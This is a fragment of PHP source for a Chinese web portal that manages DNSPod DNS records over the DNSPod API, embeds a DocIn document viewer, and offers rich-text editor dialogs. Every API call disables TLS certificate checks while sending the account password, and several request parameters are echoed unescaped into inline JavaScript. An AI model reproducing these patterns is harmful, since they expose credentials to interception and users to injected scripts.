                                        if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
                                                $xmlstr = '<?php xml version="1.0" encoding="UTF-8"?>'.
                                                                '<dnspod>'.
                                                                '<status>'.
                                                                '<code>1</code>'.
                                                                '<message>Record deleted.</message>'.
                                                                '<created_at>2008-11-26 16:16:09</created_at>'.
                                                                '</status>'.
                                                                '</dnspod>';
                                        }       
                                        else{   
                                                $ch = curl_init();
                                                $url = "https://dnsapi.cn/Record.Remove";
                                                $data = array(
                                                        'login_email' => $dnspoduname,
                                                        'login_password' => $dnspodpwd,
                                                        'domain_id' => trim(request("domain_id")),
                                                        'record_id' => $objHdd->getElementsByTagName("id")->item(0)->nodeValue,
                                                        'format' => 'xml'
                                                );
                                                $ch = curl_init();
                                                curl_setopt($ch, CURLOPT_URL, $url);
                                                curl_setopt($ch, CURLOPT_HEADER, 0);
                                                curl_setopt($ch, CURLOPT_POST, 1);
                                                curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
                                                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                                curl_setopt($ch, CURLOPT_USERAGENT, "X3193 DDNS Client/1.1 (".$dnspoduname.")");
                                                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                                                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                                                curl_setopt($ch, CURLOPT_TIMEOUT, 50);
                                                $xmlstr = curl_exec($ch);
                                                curl_close($ch);
                                        }
                                }       
                                if ($xmlstr == ""){
                                }
                                else{
                                        $objXml = new DOMDocument();  
                                        $objXml->preserveWhiteSpace = true;
                                        $objXml->async = false; 
                                        $objXml->loadXML($xmlstr);                              
                                        if ($objXml->getElementsByTagName("code")->item(0)->nodeValue == false || $objXml->getElementsByTagName("code")->item(0)->nodeValue != "1")
                                                break;
                                }       
                        }                               
                }
                elseif (trim(request("domain_id")) != "" && trim(request("record_id")) == "" && count($_POST) == 0){
                        AlertBack ("未选择任何子域名记录！" , 1);
                        break;
                }       

                $objXml = new DOMDocument();  
                $objXml->preserveWhiteSpace = true;
                $objXml->async = false; 
                $objXml->loadXML($xmlstr);                              
        
                if ($objXml->getElementsByTagName("code")->item(0)->nodeValue == "1"){
                        $timeout = "5000";
                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                子域名删除成功！<?php  echo $timeout/1000?> 秒后返回上一页
                </td>
        </tr>   
                <?php 
                        if (count($_POST)==0)
                                echo "<p align=center><script>window.setTimeout(\"history.go(-2)\",".$timeout.");</script></p>";
                        else                            
                                echo "<p align=center><script>window.setTimeout(\"history.go(-1)\",".$timeout.");</script></p>";                ?>
</table>                        
                <?php 
                }
                else{
                        $timeout = "5000";
                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                子域名删除失败！原因： <?php echo $objXml->getElementsByTagName("message")->item(0)->nodeValue;?><?php  echo " <br>".($timeout/1000)?> 秒后返回上一页
                </td>
        </tr>   
                <?php 
                        if (count($_POST)==0)
                                echo "<p align=center><script>window.setTimeout(\"history.go(-2)\",".$timeout.");</script></p>";
                        else                            
                                echo "<p align=center><script>window.setTimeout(\"history.go(-1)\",".$timeout.");</script></p>";                ?>
</table>                        
                <?php       
                }

                break;   // action - Record.Remove end  
        case "Record.Status": // action - Record.Status start
                if (trim(request("domain_id")) != "" && trim(request("record_id")) != ""){
                        if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
                                $xmlstr = '<?php xml version="1.0" encoding="UTF-8"?>'.
                                                '<dnspod>'.
                                                '<status>'.
                                                '<code>1</code>'.
                                                '<message>Record status changed.</message>'.
                                                '<created_at>2008-11-26 16:16:09</created_at>'.
                                                '</status>'.
                                                '</dnspod>';
                        }       
                        else{   
                                $ch = curl_init();
                                $url = "https://dnsapi.cn/Record.Status";
                                $data = array(
                                        'login_email' => $dnspoduname,
                                        'login_password' => $dnspodpwd,
                                        'domain_id' => trim(request("domain_id")),
                                        'record_id' => trim(request("record_id")),
                                        'status' => trim(request("status")),
                                        'format' => 'xml'
                                );
                                $ch = curl_init();
                                curl_setopt($ch, CURLOPT_URL, $url);
                                curl_setopt($ch, CURLOPT_HEADER, 0);
                                curl_setopt($ch, CURLOPT_POST, 1);
                                curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
                                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                curl_setopt($ch, CURLOPT_USERAGENT, "X3193 DDNS Client/1.1 (".$dnspoduname.")");
                                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                                curl_setopt($ch, CURLOPT_TIMEOUT, 50);
                                $xmlstr = curl_exec($ch);
                                curl_close($ch);
                        }
                }
                elseif (trim(request("domain_id")) != "" && trim(request("record_id")) == "" && count($_POST) > 0){
                        if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
                                $totalrecord = '220';
                                $xmlstr = '<?php xml version="1.0" encoding="UTF-8"?>'.
                                                '<dnspod>'.
                                                '<status>'.
                                                '<code>1</code>'.
                                                '<message>Get domain list success</message>'.
                                                '<created_at>2008-11-26 16:12:00</created_at>'.
                                                '</status>'.
                                                '<info>'.
                                                '<domain_total>'.$totalrecord.'</domain_total>'.
                                                '</info>'.
                                                '<domains>';
                                if (ceil($totalrecord/$pagesize) > $page){
                                        $strpagesize = $pagesize;
                                }       
                                elseif (ceil($totalrecord/$pagesize) == $page){
                                        $strpagesize = fmod($totalrecord,$pagesize);
                                }                               
                                for($i=1;$i<=$strpagesize;$i++){
                                        $xmlstr = $xmlstr.
                                                        '<item>'.
                                                        '<id>141842</id>'.
                                                        '<name>dnspoo.com</name>'.
                                                        '<grade>D_Free</grade>'.
                                                        '<status>enable</status>'.
                                                        '<records>0</records>'.
                                                        '<shared_from>dnspod@dnspod.com</shared_from>'.
                                                        '</item>';              
                                }
                                $xmlstr = $xmlstr.
                                                '</domains>'.
                                                '</dnspod>';
                        }       
                        else{   
                                $ch = curl_init();
                                $url = "https://dnsapi.cn/Record.List";
                                $data = array(
                                        'login_email' => $dnspoduname,
                                        'login_password' => $dnspodpwd,
                                        'format' => 'xml',
                                        'domain_id' => trim(request("domain_id")),
                                        'offset' => $pagesize*($page-1),
                                        'length' => $pagesize
                                );
                                $ch = curl_init();
                                curl_setopt($ch, CURLOPT_URL, $url);
                                curl_setopt($ch, CURLOPT_HEADER, 0);
                                curl_setopt($ch, CURLOPT_POST, 1);
                                curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
                                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                curl_setopt($ch, CURLOPT_USERAGENT, "X3193 DDNS Client/1.1 (".$dnspoduname.")");
                                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                                curl_setopt($ch, CURLOPT_TIMEOUT, 50);
                                $xmlstr = curl_exec($ch);
                                curl_close($ch);
                        }
                        $type = trim(request('type'))==''?'mine':trim(request('type'));
                        $objXml = new DOMDocument();  
                        $objXml->preserveWhiteSpace = true;
                        $objXml->async = false; 
                        // 加Xml 文件    
                        $objXml->loadXML($xmlstr);      
                
                        $objList = $objXml->getElementsByTagName("item");                       
                        if ($objList->length == $pagesize) $strpagesize = $pagesize; else $strpagesize = $objList->length;

                        $totalitem = $objXml->getElementsByTagName("domain_total")->item(0)->nodeValue;
                        if (fmod($totalitem, $pagesize) == 0){
                                $totalpage=$totalitem/$pagesize;
                        }       
                        else{
                                $totalpage=ceil($totalitem/$pagesize);
                        }

                        $xmlstr = "";
                        for($i = 0;$i <= $strpagesize-1;$i++){
                                $objHdd = $objList->item($i);
                                if ($_POST["chidd".$i] != ""){
                                        if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
                                                $xmlstr = '<?php xml version="1.0" encoding="UTF-8"?>'.
                                                                '<dnspod>'.
                                                                '<status>'.
                                                                '<code>1</code>'.
                                                                '<message>Record status changed.</message>'.
                                                                '<created_at>2008-11-26 16:16:09</created_at>'.
                                                                '</status>'.
                                                                '</dnspod>';                                    
                                        }       
                                        else{   
                                                $ch = curl_init();
                                                $url = "https://dnsapi.cn/Record.Status";
                                                $data = array(
                                                        'login_email' => $dnspoduname,
                                                        'login_password' => $dnspodpwd,
                                                        'domain_id' => trim(request("domain_id")),
                                                        'record_id' => $objHdd->getElementsByTagName("id")->item(0)->nodeValue,
                                                        'status' => trim(request("status")),
                                                        'format' => 'xml'
                                                );
                                                $ch = curl_init();
                                                curl_setopt($ch, CURLOPT_URL, $url);
                                                curl_setopt($ch, CURLOPT_HEADER, 0);
                                                curl_setopt($ch, CURLOPT_POST, 1);
                                                curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
                                                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                                curl_setopt($ch, CURLOPT_USERAGENT, "X3193 DDNS Client/1.1 (".$dnspoduname.")");
                                                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                                                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                                                curl_setopt($ch, CURLOPT_TIMEOUT, 50);
                                                $xmlstr = curl_exec($ch);
                                                curl_close($ch);
                                        }
                                }       
                                if ($xmlstr == ""){
                                }
                                else{
                                        $objXml = new DOMDocument();  
                                        $objXml->preserveWhiteSpace = true;
                                        $objXml->async = false; 
                                        $objXml->loadXML($xmlstr);                              
                                        if ($objXml->getElementsByTagName("code")->item(0)->nodeValue == false || $objXml->getElementsByTagName("code")->item(0)->nodeValue != "1")
                                                break;
                                }       
                        }                               
                }
                elseif (trim(request("domain_id")) != "" && trim(request("record_id")) == "" && count($_POST) == 0){
                        AlertBack ("未选择任何子域名记录！" , 1);
                        break;
                }
                
                $objXml = new DOMDocument();  
                $objXml->preserveWhiteSpace = true;
                $objXml->async = false; 
                $objXml->loadXML($xmlstr);                              
        
                if ($objXml->getElementsByTagName("code")->item(0)->nodeValue == "1"){
                $timeout = "5000"
                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                子域名记录<?php  if (trim(request("status")) == "enable"){ ?>启动<?php  }else{ ?>停止<?php }?>成功！<?php echo ($timeout/1000)?> 秒后返回上一页
                </td>
        </tr>   
                <?php 
                        echo "<p align=center><script>window.setTimeout(\"location.href=\'".urldecode(trim(request("refer")))."\'\",".$timeout.");</script></p>"
                ?>
</table>                        
                <?php 
                }
                else{
                $timeout = "5000"
                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                子域名记录<?php  if (trim(request("status")) == "enable"){ ?>启动<?php  }else{ ?>停止<?php }?>失败！, 原因: <?php echo $objXml->getElementsByTagName("message")->item(0)->nodeValue?><?php echo " <br>".$timeout/1000?> 秒后返回上一页
                </td>
        </tr>   
                <?php 
                        echo "<p align=center><script>window.setTimeout(\"location.href=\'".urldecode(trim(request("refer")))."\'\",".$timeout.");</script></p>"
                ?>
</table>                        
                <?php       
                }
                break;   // action - Record.Status end
        }       
                        
$style->footer();
exit;
} // dnspod function end
?>

<?php 
function docin(){ // docin function end
header('Content-Type: text/html; charset=gb2312');
?>
<head>
<?php 
$style = new css();
$style->ico();
$style->title("X3193 - 读书");
$skincolor = selstyle(trim(request("skin")));
$sCrLf = chr(13) . chr(10); // 回车 + 换行
?>

<table width="100%" height="100%" align="center" valign="center">
        <tr>
                <td align="center" valign="middle">
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr>
                <td align="left" style="border:0">
                <?php  selskin(); ?>
                </td>
                <td align="right" style="border:0">             
                        <?php  
                         IF(!is_wap())
                        	sellink("主页|插件|搜索|地球|域名|相册|网址|FTP|读书|邮箱|游戏|邮件|短片|股票|VPN",$skincolor);
                        else
                        	sellink("主页|搜索|域名|相册|网址|FTP|邮箱|邮件|短片",$skincolor);
                        ?>
                </td>
        </tr>           
</table>

<?php 
if (trim(request("qs_title")) == "" && trim(request("qs_url")) == "" and trim(request("qs_desc")) == ""){
?>
<script>
function changeimg()
{
 document.getElementById("ccimg").src = '<?php echo ScriptPath();?>?api=checkcode&a=' + Math.random();
}
</script>
<table width="95%" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center" height="35">
                        <form action="<?php echo ScriptPath();?>?api=docin" method="post" name="docin">
                        &nbsp标题：<input type="text" class="text" name="qs_title" value="" style="height:20px;width:10%;font-size:11px" <?php  $style->textarea("#FCFC9D","");?>>  
                        &nbsp连接：<input type="text" class="text" name="qs_url" value="" style="height:20px;width:20%;font-size:11px" <?php  $style->textarea("#FCFC9D","");?>> 
                        &nbsp描述：<input type="text" class="text" name="qs_desc" value="" style="height:20px;width:10%;font-size:11px" <?php  $style->textarea("#FCFC9D","");?>>
                        &nbsp验证码：<input maxlength="4" name="checkcode" id="checkcode" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="看不清楚？换一个！"><IMG id="ccimg" height="13" src="<?php echo ScriptPath();?>?api=checkcode" border="0"></a>
                        <input type="hidden" class="text" name="skin" value="<?php echo $skincolor;?>"> 
                        &nbsp<input type="submit" class="button" name="docinSubmit" value=" Go ">
                </td>
        </tr>   
</table>
<?php 
}
elseif (trim($_POST["qs_url"]) != "" && trim($_GET["qs_url"]) == "")
        redirect (ScriptPath()."?".$_SERVER['QUERY_STRING']."&skin=".$skincolor."&qs_url=".encodeuri(trim($_POST["qs_url"]))."&qs_desc=".encodeuri(trim($_POST["qs_desc"]))."&qs_title=".encodeuri(trim($_POST["qs_title"]))."&checkcode=".trim(request("checkcode")));
elseif (trim($_POST["qs_url"]) == "" && trim($_GET["qs_url"]) != ""){
        if (substr(trim(request("qs_url")),0,7) != "http://" && substr(trim(request("qs_url")),8) != "https://" && substr(trim(request("qs_url")),0,6) != "ftp://")
                AlertBack ("连接中未包括 HTTP:// ",2);
        elseIf ($_SESSION['ValidCode'] != "" && $_SESSION['ValidCode'] != trim(request("checkcode"))){
                if (trim(request("checkcode")) != ""){
                        AlertBack("四位验证码错误！" , 1);
                        break;
                }       
                elseif (trim(request("checkcode")) == ""){
                        AlertBack("四位验证码为空！" , 1);
                        break;
                }               
        }
                        
?>
<table width="95%" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center" height="15">
                </td>
        </tr>   
</table>
<script type="text/javascript">
var qs_userid = 4233423;                      //这是你注册的API帐户ID，请勿改动
var qs_url = "<?php echo trim(request("qs_url"));?>";             //定义可直接访问到文档的URL
var qs_title="<?php echo trim(request("qs_title"));?>";         //文档标题定义
var qs_desc="<?php echo trim(request("qs_desc"));?>";           //文档简介或描述
var qs_playerDiv="playerDiv";
</script>
<script type="text/javascript" src="http://www.docin.com/apps/quickswitch/auto.js"></script>
<table width="95%" height="81%" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr align="center" style="border:0">
                <td align="right">
                        <div id="playerDiv" style="width:100%;height:100%;"></div>
                </td>
        </tr>
</table>                
<?php 
}

$style->footer(); 
exit;
} // docin function end
?>

<?php 
function editor(){
header('Content-Type: text/html; charset=gb2312');

?>
<head>
<?php 
$style = new css();
$style->ico();
$style->title("X3193 - 编辑");
$skincolor = selstyle(trim(request("skin")));
$sCrLf = chr(13) . chr(10); // 回车 + 换行
?>

<?php 
if (trim($_POST["richedit"]) != "" && trim(request("action")) == ""){
        redirect(ScriptPath()."?api=editor&skin=".$skincolor."&action=".trim(request("action"))."&richedit=".encodeuri(encodeuri(trim(request("richedit"))))."&button=".trim(request("button"))."&editmodel=".trim($_POST["editmodel"]));
        break;
}
switch (trim(request('action'))) {  // case start
        case "selcolor":
        ?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">

<html>
<head>
        <title>Text Color</title>
        <script language="JavaScript" type="text/javascript">
        <!--
        function selectColor(color) {
                self.parent.setColor(color);
        }
        
        function InitColorPalette() {
                if (document.getElementsByTagName)
                        var x = document.getElementsByTagName('TD');
                else if (document.all)
                        var x = document.all.tags('TD');
                for (var i=0; i < x.length; i++) {
                        x[i].onmouseover = over;
                        x[i].onmouseout = out;
                        x[i].onclick = click;
                }
        }
        
        function over() {
                this.style.border = '1px dotted white';
        }
        
        function out() {
                this.style.border = '1px solid gray';
        }
        
        function click() {
                selectColor(this.id);
        }
        //-->
        </script>

<body bgcolor="white" onLoad="InitColorPalette()" leftmargin="0" rightmargin="0" marginwidth="0" marginheight="0" topmargin="0" bottommargin="0">
<table width="150" height="100" cellpadding="0" cellspacing="1" border="1" align="center">
        <tr>
                <td id="#FFFFFF" bgcolor="#FFFFFF" width="10" height="10"><img width="1" height="1"></td>
                <td id="#FFCCCC" bgcolor="#FFCCCC" width="10" height="10"><img width="1" height="1"></td>
                <td id="#FFCC99" bgcolor="#FFCC99" width="10" height="10"><img width="1" height="1"></td>
                <td id="#FFFF99" bgcolor="#FFFF99" width="10" height="10"><img width="1" height="1"></td>
                <td id="#FFFFCC" bgcolor="#FFFFCC" width="10" height="10"><img width="1" height="1"></td>
                <td id="#99FF99" bgcolor="#99FF99" width="10" height="10"><img width="1" height="1"></td>
                <td id="#99FFFF" bgcolor="#99FFFF" width="10" height="10"><img width="1" height="1"></td>
                <td id="#CCFFFF" bgcolor="#CCFFFF" width="10" height="10"><img width="1" height="1"></td>
                <td id="#CCCCFF" bgcolor="#CCCCFF" width="10" height="10"><img width="1" height="1"></td>
                <td id="#FFCCFF" bgcolor="#FFCCFF" width="10" height="10"><img width="1" height="1"></td>
        </tr>
        <tr>
                <td id="#CCCCCC" bgcolor="#CCCCCC" width="10" height="10"><img width="1" height="1"></td>
                <td id="#FF6666" bgcolor="#FF6666" width="10" height="10"><img width="1" height="1"></td>
                <td id="#FF9966" bgcolor="#FF9966" width="10" height="10"><img width="1" height="1"></td>
                <td id="#FFFF66" bgcolor="#FFFF66" width="10" height="10"><img width="1" height="1"></td>
                <td id="#FFFF33" bgcolor="#FFFF33" width="10" height="10"><img width="1" height="1"></td>
                <td id="#66FF99" bgcolor="#66FF99" width="10" height="10"><img width="1" height="1"></td>
                <td id="#33FFFF" bgcolor="#33FFFF" width="10" height="10"><img width="1" height="1"></td>
                <td id="#66FFFF" bgcolor="#66FFFF" width="10" height="10"><img width="1" height="1"></td>
                <td id="#9999FF" bgcolor="#9999FF" width="10" height="10"><img width="1" height="1"></td>
                <td id="#FF99FF" bgcolor="#FF99FF" width="10" height="10"><img width="1" height="1"></td>
        </tr>
        <tr>
                <td id="#C0C0C0" bgcolor="#C0C0C0" width="10" height="10"><img width="1" height="1"></td>
                <td id="#FF0000" bgcolor="#FF0000" width="10" height="10"><img width="1" height="1"></td>
                <td id="#FF9900" bgcolor="#FF9900" width="10" height="10"><img width="1" height="1"></td>
                <td id="#FFCC66" bgcolor="#FFCC66" width="10" height="10"><img width="1" height="1"></td>
                <td id="#FFFF00" bgcolor="#FFFF00" width="10" height="10"><img width="1" height="1"></td>
                <td id="#33FF33" bgcolor="#33FF33" width="10" height="10"><img width="1" height="1"></td>
                <td id="#66CCCC" bgcolor="#66CCCC" width="10" height="10"><img width="1" height="1"></td>
                <td id="#33CCFF" bgcolor="#33CCFF" width="10" height="10"><img width="1" height="1"></td>
                <td id="#6666CC" bgcolor="#6666CC" width="10" height="10"><img width="1" height="1"></td>
                <td id="#CC66CC" bgcolor="#CC66CC" width="10" height="10"><img width="1" height="1"></td>
        </tr>
        <tr>
                <td id="#999999" bgcolor="#999999" width="10" height="10"><img width="1" height="1"></td>
                <td id="#CC0000" bgcolor="#CC0000" width="10" height="10"><img width="1" height="1"></td>
                <td id="#FF6600" bgcolor="#FF6600" width="10" height="10"><img width="1" height="1"></td>
                <td id="#FFCC33" bgcolor="#FFCC33" width="10" height="10"><img width="1" height="1"></td>
                <td id="#FFCC00" bgcolor="#FFCC00" width="10" height="10"><img width="1" height="1"></td>
                <td id="#33CC00" bgcolor="#33CC00" width="10" height="10"><img width="1" height="1"></td>
                <td id="#00CCCC" bgcolor="#00CCCC" width="10" height="10"><img width="1" height="1"></td>
                <td id="#3366FF" bgcolor="#3366FF" width="10" height="10"><img width="1" height="1"></td>
                <td id="#6633FF" bgcolor="#6633FF" width="10" height="10"><img width="1" height="1"></td>
                <td id="#CC33CC" bgcolor="#CC33CC" width="10" height="10"><img width="1" height="1"></td>
        </tr>
        <tr>
                <td id="#666666" bgcolor="#666666" width="10" height="10"><img width="1" height="1"></td>
                <td id="#990000" bgcolor="#990000" width="10" height="10"><img width="1" height="1"></td>
                <td id="#CC6600" bgcolor="#CC6600" width="10" height="10"><img width="1" height="1"></td>
                <td id="#CC9933" bgcolor="#CC9933" width="10" height="10"><img width="1" height="1"></td>
                <td id="#999900" bgcolor="#999900" width="10" height="10"><img width="1" height="1"></td>
                <td id="#009900" bgcolor="#009900" width="10" height="10"><img width="1" height="1"></td>
                <td id="#339999" bgcolor="#339999" width="10" height="10"><img width="1" height="1"></td>
                <td id="#3333FF" bgcolor="#3333FF" width="10" height="10"><img width="1" height="1"></td>
                <td id="#6600CC" bgcolor="#6600CC" width="10" height="10"><img width="1" height="1"></td>
                <td id="#993399" bgcolor="#993399" width="10" height="10"><img width="1" height="1"></td>
        </tr>
        <tr>
                <td id="#333333" bgcolor="#333333" width="10" height="10"><img width="1" height="1"></td>
                <td id="#660000" bgcolor="#660000" width="10" height="10"><img width="1" height="1"></td>
                <td id="#993300" bgcolor="#993300" width="10" height="10"><img width="1" height="1"></td>
                <td id="#996633" bgcolor="#996633" width="10" height="10"><img width="1" height="1"></td>
                <td id="#666600" bgcolor="#666600" width="10" height="10"><img width="1" height="1"></td>
                <td id="#006600" bgcolor="#006600" width="10" height="10"><img width="1" height="1"></td>
                <td id="#336666" bgcolor="#336666" width="10" height="10"><img width="1" height="1"></td>
                <td id="#000099" bgcolor="#000099" width="10" height="10"><img width="1" height="1"></td>
                <td id="#333399" bgcolor="#333399" width="10" height="10"><img width="1" height="1"></td>
                <td id="#663366" bgcolor="#663366" width="10" height="10"><img width="1" height="1"></td>
        </tr>
        <tr>
                <td id="#000000" bgcolor="#000000" width="10" height="10"><img width="1" height="1"></td>
                <td id="#330000" bgcolor="#330000" width="10" height="10"><img width="1" height="1"></td>
                <td id="#663300" bgcolor="#663300" width="10" height="10"><img width="1" height="1"></td>
                <td id="#663333" bgcolor="#663333" width="10" height="10"><img width="1" height="1"></td>
                <td id="#333300" bgcolor="#333300" width="10" height="10"><img width="1" height="1"></td>
                <td id="#003300" bgcolor="#003300" width="10" height="10"><img width="1" height="1"></td>
                <td id="#003333" bgcolor="#003333" width="10" height="10"><img width="1" height="1"></td>
                <td id="#000066" bgcolor="#000066" width="10" height="10"><img width="1" height="1"></td>
                <td id="#330099" bgcolor="#330099" width="10" height="10"><img width="1" height="1"></td>
                <td id="#330033" bgcolor="#330033" width="10" height="10"><img width="1" height="1"></td>
        </tr>
</table>

        <?php 
                break;
        case "insertlink":
                ?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">

<html>
<head>
        <title>创建链接</title>
        <meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<script language="JavaScript" type="text/javascript">
<!--
var ua = navigator.userAgent.toLowerCase();
var isIE = ((ua.indexOf("msie") != -1) && (ua.indexOf("opera") == -1) && (ua.indexOf("webtv") == -1));
var ieVersion = parseFloat( ua.substring( ua.indexOf('msie ') + 5 ) );
var isGecko = (ua.indexOf("gecko") != -1);
var isSafari = (ua.indexOf("safari") != -1);
var safariVersion = parseFloat(ua.substring(ua.lastIndexOf("safari/") + 7));
var isKonqueror = (ua.indexOf("konqueror") != -1);
var isOpera = (ua.indexOf("opera") != -1);
var isNetscape = (ua.indexOf("netscape") != -1);

function getQueryVariable(variable) {
        try {
                var query = window.location.search.substring(1);
                var vars = query.split("&");
                for (var i=0; i < vars.length; i++) {
                        var pair = vars[i].split("=");
                        if (pair[0] == variable) {
                                return unescape(pair[1]);
                        }
                }
        } catch (e) {
                alert(e);
        }
}

function AddLink() {
        try {
                var oForm = document.linkForm;
                
                //validate form
                if (oForm.url.value == '') {
                        alert('请输入链接地址.');
                        return false;
                }
                if (oForm.linkText.value == '') {
                        alert('请输入内容.');
                        return false;
                }
                
                var html = '<a href="' + document.linkForm.url.value + '" target="' + document.linkForm.linkTarget.options[document.linkForm.linkTarget.selectedIndex].value + '">' + document.linkForm.linkText.value + '</a>';
                
                opener.insertHTML(html);
                window.close();
                return true;
        } catch (e) {
                alert(e);
        }
}

function setLinkText(linkText) {
        //set link text value in insert link dialog
        try {
                document.linkForm.linkText.value = linkText;
        } catch (e) {
                //may take some time to create dialog window.
                //Keep looping until able to set.
                //alert(e);
                setInterval("setLinkText('" + linkText + "')", 100);
        }
}
//-->
</script>


<body style="margin: 10px; background: #D3D3D3;">

<form name="linkForm" onSubmit="return AddLink();">
<table align="center" cellpadding="4" cellspacing="0" border="0">
        <tr><td colspan="2"><span style="font-style: italic; font-size: x-small;"><b>提示:</b> 输入邮件地址时, 请在地址前加上 "mailto:"</span></td></tr>
        <tr>
                <td align="right">链接地址:</td>
                <td><input name="url" type="text" id="url" size="34"></td>
        </tr>
        <tr>
                <td align="right">内容:</td>
                <td><input name="linkText" type="text" id="linkText" size="34"></td>
        </tr>
        <tr>
                <td align="right">打开方式:</td>
                <td align="left">
                        <select name="linkTarget" id="linkTarget">
                                <option value="_blank">_blank</option>
                                <option value="_parent">_parent</option>
                                <option value="_self" selected>_self</option>
                                <option value="_top">_top</option>
                        </select>
                </td>
        </tr>
        <tr>
                <td colspan="3" align="center">
                        <input type="submit" style="WIDTH: 70px" value="插 入" />&nbsp;&nbsp;&nbsp;
                        <input type="button" style="WIDTH: 70px" value="取 消" onClick="window.close();" />
                </td>
        </tr>
</table>

</form>
<script language="JavaScript" type="text/javascript">
<!--
setLinkText(getQueryVariable("selectionText"));
//-->
</script>

        
                <?php 
                break;
        case "inserttable":
                ?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">

<html>
<head>
        <title>创建表格</title>
        <meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<script language="JavaScript" type="text/javascript">
<!--
function AddTable() {
        var widthType = (document.tableForm.widthType.value == "pixels") ? "" : "%";
        var html = '<table border="' + document.tableForm.border.value + '" cellpadding="' + document.tableForm.padding.value + '" ';
        
        html += 'cellspacing="' + document.tableForm.spacing.value + '" width="' + document.tableForm.width.value + widthType + '">\n';
        for (var rows = 0; rows < document.tableForm.rows.value; rows++) {
                html += "<tr>\n";
                for (cols = 0; cols < document.tableForm.columns.value; cols++) {
                        html += "<td>&nbsp;</td>\n";
                }
                html+= "</tr>\n";
        }
        html += "</table>\n";
        
        window.opener.insertHTML(html);
        window.close();
}
//-->
</script>


<body style="margin: 10px; background: #D3D3D3;">

<form name="tableForm">
<table align="center" cellpadding="4" cellspacing="0" border="0">
        <tr>
                <td align="right">行:</td>
                <td><input name="rows" type="text" id="rows" value="2" size="4"></td>
                <td align="left">列: <input name="columns" type="text" id="columns" value="2" size="4"></td>
        </tr>
        <tr>
                <td align="right">表宽:</td>
                <td><input name="width" type="text" id="width" value="100" size="4"></td>
                <td align="left">
                        <select name="widthType" id="widthType">
                                <option value="pixels">pixels</option>
                                <option value="percent" selected>percent</option>
                        </select>
                </td>
        </tr>
        <tr>
                <td align="right">边框宽度:</td>
                <td><input name="border" type="text" id="border" value="1" size="4"></td>
                <td align="left">&nbsp;</td>
        </tr>
        <tr>
                <td align="right">单元格边框:</td>
                <td><input name="padding" type="text" id="padding" value="4" size="4"></td>
                <td>单元格间隔: <input name="spacing" type="text" id="0" value="0" size="4"></td>
        </tr>
        <tr>
                <td colspan="3" align="center">
                        <input type="button" value="插入表格" onClick="AddTable();" />&nbsp;&nbsp;&nbsp;
                        <input type="button" style="WIDTH: 70px" value="取 消" onClick="window.close();" />
                </td>
        </tr>
</table>

</form>

                
                <?php 
                break;
        default :
        
        ?>
<table width="100%" height="100%" align="center" valign="center">
        <tr>
                <td align="center" valign="middle">
<table width="88%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr>
                <td align="left" style="border:0">
                <?php  selskin(); ?>
                </td>
                <td align="right" style="border:0">             
                        <?php  
                         IF(!is_wap())
                        	sellink("主页|插件|搜索|地球|域名|相册|网址|FTP|读书|邮箱|游戏|邮件|短片|股票|VPN",$skincolor);
                        else
                        	sellink("主页|搜索|域名|相册|网址|FTP|邮箱|邮件|短片",$skincolor);
                        ?>
                </td>
        </tr>           
</table>
<?php 

        $editor = new editor_class;
        $editor->editorCSS();
        $editor->editorLoad();
        $editor->editorControl("editor");
        //$editor->editorMain("smtp",scriptpath()."?api=smtp&action=sendmail&skin=".$skincolor,"90%","");
